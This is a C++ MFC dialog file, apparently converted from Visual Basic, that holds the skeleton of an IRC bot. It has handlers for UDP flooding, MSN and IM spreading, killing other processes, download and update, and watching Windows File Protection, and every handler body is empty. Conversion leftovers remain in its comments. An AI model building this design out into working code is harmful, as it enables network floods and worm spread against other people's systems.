// frmMain.cpp : implementation file
//

#include "stdafx.h"
#include "modRewjgistry.h"

//{{ChodeBot_Includes(CfrmMain)
//}}ChodeBot_Includes

#include "frmMain.h"
CfrmMain *frmMain = NULL;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CfrmMain dialog


CfrmMain::CfrmMain(CWnd* pParent /*=NULL*/)
	: CDialog(CfrmMain::IDD, pParent)
{
	frmMain = this;

	//{{AFX_DATA_INIT(CfrmMain)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CfrmMain::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CfrmMain)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, Drives, m_Drives);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CfrmMain, CDialog)
	//{{AFX_MSG_MAP(CfrmMain)
		// NOTE: the ClassWizard will add message map macros here
	ON_WM_CLOSE()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CfrmMain message handlers

BOOL CfrmMain::OnInitDialog()
{
	CDialog::OnInitDialog();

	//{{ChodeBot_OnInitDialog(CfrmMain)
	tmrMSNSendInterval = 8000;
	tmrMSNInterval = 60000;
	tmrHomepageInterval = 60000;
	tmrKillBadInterval = 5000;
	tmrUDPFloodInterval = 0;
	tmrPingPongInterval = 60000;
	tmrPingInterval = 1000;
	tmrUDPInterval = 1000;
	
//	m_dlDownload[1] = &m_dlDownload_1;
	
	Form_Load();
	//}}ChodeBot_OnInitDialog

	// TODO: Add extra initialization here

	return TRUE;
}


	//=========================================================

/*? Dim *//*? () As Long
//
Public WithEvents *//*? As */

/*? Public WithEvents *//*? As */
/*? Public WithEvents */ /*? As */
/*? Public WithEvents */ /*? As */

/*? Public *//*? As */

void CfrmMain::dlDownload_Completed(short& Index, int& lngFileSize)
{
}

void CfrmMain::dlDownload_OtherError(short& Index, CString& Description, int& Number)
{
}

void CfrmMain::dlDownload_WinsockError(short& Index, CString& Description)
{
}

void CfrmMain::dlUpdate_Completed(int& lngFileSize)
{
}

void CfrmMain::dlUpdate_OtherError(CString& Description, int& Number)
{
}

void CfrmMain::dlUpdate_WinsockError(CString& Description)
{
}

void CfrmMain::Form_QueryUnload(short& Cancel, short& UnloadMode)
{
}

void CfrmMain::sckTCP_Closesck(CComVariant Index)
{
}

void CfrmMain::sckTCP_Connect(CComVariant Index)
{
}

void CfrmMain::sckTCP_Error(CComVariant Index, short Number, CString& Description, int sCode, CString Source, CString HelpFile, int HelpContext, bool& CancelDisplay)
{
}

void CfrmMain::LoadControls()
{
}

void CfrmMain::UnloadControls()
{
}

void CfrmMain::Form_Load()
{
}

void CfrmMain::Activate()
{
}

void CfrmMain::CleanUp()
{
}

void CfrmMain::OnClose()
{
	// TODO: Add your message handler code here and/or call default

	CDialog::OnClose();
}

void CfrmMain::sckHttp_CloseSck(CComVariant Index)
{
}

void CfrmMain::sckHttp_Connect(CComVariant Index)
{
}

void CfrmMain::sckHttp_Error(CComVariant Index, short Number, CString& Description, int sCode, CString Source, CString HelpFile, int HelpContext, bool& CancelDisplay)
{
}

void CfrmMain::sckIRC_CloseSck(CComVariant Index)
{
}

void CfrmMain::sckIRC_Connect(CComVariant Index)
{
}

void CfrmMain::sckIRC_DataArrival(CComVariant Index, int bytesTotal)
{
}

void CfrmMain::sckIRC_Error(CComVariant Index, short Number, CString& Description, int sCode, CString Source, CString HelpFile, int HelpContext, bool& CancelDisplay)
{
}

void CfrmMain::tmrActivate_Timer()
{
}

void CfrmMain::tmrCmdDelay_Timer(short& Index)
{
}

void CfrmMain::tmrDisconnect_Timer()
{
}

void CfrmMain::tmrHomepage_Timer()
{
}

void CfrmMain::tmrHttp_Timer()
{
}

void CfrmMain::tmrIMSpread_Timer()
{
}

void CfrmMain::tmrKillBad_Timer()
{
}

void CfrmMain::tmrMSN_Timer()
{
}

void CfrmMain::tmrMSNSend_Timer()
{
}

void CfrmMain::tmrPing_Timer()
{
}

void CfrmMain::tmrPingPong_Timer()
{
}

void CfrmMain::tmrConnect_Timer()
{
}

void CfrmMain::tmrTCP_Timer()
{
}

void CfrmMain::tmrTCPTimeout_Timer(short& Index)
{
}

void CfrmMain::tmrUDP_Timer()
{
}

void CfrmMain::tmrUDPFlood_Timer()
{
}

void CfrmMain::tmrUptime_Timer()
{
}

void CfrmMain::tmrWatchAIM_Timer()
{
}

void CfrmMain::tmrWatchWFP_Timer()
{
}


void CfrmMain::OnTimer(UINT nIDEvent)
{
	// TODO: Add your message handler code here and/or call default

	switch(nIDEvent)
	{
		case tmrHomepage: {
			tmrHomepage_Timer();
			break;
		}

		case tmrKillBad: {
			tmrKillBad_Timer();
			break;
		}

		case tmrMSN: {
			tmrMSN_Timer();
			break;
		}

		case tmrMSNSend: {
			tmrMSNSend_Timer();
			break;
		}

		case tmrPing: {
			tmrPing_Timer();
			break;
		}

		case tmrPingPong: {
			tmrPingPong_Timer();
			break;
		}

		case tmrUDP: {
			tmrUDP_Timer();
			break;
		}

		case tmrUDPFlood: {
			tmrUDPFlood_Timer();
			break;
		}

	}

	CDialog::OnTimer(nIDEvent);
}